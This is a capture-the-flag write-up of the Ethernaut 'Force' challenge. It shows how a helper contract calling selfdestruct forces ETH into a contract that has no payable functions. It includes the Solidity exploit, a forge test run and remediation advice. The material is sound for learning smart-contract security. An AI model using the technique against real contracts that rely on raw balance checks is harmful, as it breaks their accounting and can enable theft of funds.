# Force — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 07 — Force](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-force) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Force.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (for balance-based invariants) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`Force` has no payable entry points, so normal ETH transfers fail. ETH can still be injected by deploying a helper that calls `selfdestruct(payable(force))`, which credits the target balance without running its code.

**Impact:** any protocol logic that assumes “balance only changes through our payable functions” is false. Classic setup for broken vault / share-price / “empty contract” checks.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Force holds ETH | `address(forceInstance).balance > 0` |

---

## Finding

### [C-01] Forced ETH via `selfdestruct`

| Field | Detail |
|-------|--------|
| **Severity** | Critical (invariant break) |
| **Bug class** | Unexpected ether / unsafe balance reliance |
| **Location** | N/A — empty contract; vector is external |
| **CWE** | [CWE-841](https://cwe.mitre.org/data/definitions/841.html) — Improper Enforcement of Behavioral Workflow |
| **SWC** | [SWC-132](https://swcregistry.io/docs/SWC-132) — Unexpected Ether balance |

#### Why normal sends fail

No `receive()`, no payable `fallback()`, no payable functions → `call{value:}` returns false / reverts.

#### Why `selfdestruct` works

The EVM transfers the dying contract’s balance to the beneficiary as part of the opcode. The beneficiary’s code is **not** executed.

EIP-6780 (Cancun) limited when code/storage are deleted; **force-sending ETH still works**.

#### Proof of concept

```bash
cd web3-ctf-challenges/07-ethernaut-force
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 136586)
```

---

## Attack scenario

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Deploy payable helper with ≥ 1 wei |
| **2. Call** | `selfdestruct(payable(force))` in constructor or method |
| **3. Result** | `force.balance >= 1` |
| **4. Cost** | 1 wei + deploy gas |
| **5. ROI** | Breaks “empty balance” win condition / real invariants |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    new HelperContract{value: 1 wei}(payable(address(forceInstance)));

    vm.stopBroadcast();
}
```

---

## Remediation

- Use internal accounting for user deposits; do not key logic off raw `address(this).balance`.
- Document that balance can rise via force-send / coinbase.
- Avoid “if balance == 0 then …” security checks.

---

## Key lessons

1. **No payable ≠ immutable zero balance.**
2. **`selfdestruct` bypasses receive/fallback.**
3. **Balance is not an access-control signal.**

---

## References

- [SCH Force challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-force)
- [SWC-132: Unexpected Ether balance](https://swcregistry.io/docs/SWC-132)
- Local: `Exploit.s.sol`, `test/ForceExploit.t.sol`
